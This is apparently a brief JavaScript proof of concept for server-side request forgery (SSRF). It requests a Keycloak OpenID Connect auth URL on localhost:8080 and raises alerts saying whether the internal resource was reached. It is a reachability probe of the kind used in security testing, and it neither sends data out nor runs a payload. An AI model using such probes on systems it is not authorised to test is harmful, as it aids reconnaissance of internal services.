fetch('http://localhost:8080/realms/master/protocol/openid-connect/auth')
  .then(response => {
    if (response.status === 200) {
      alert('SSRF Success: Resource found');
    } else {
      alert('SSRF Failed: Status ' + response.status);
    }
  })
  .catch(error => alert('SSRF Failed: ' + error.message));
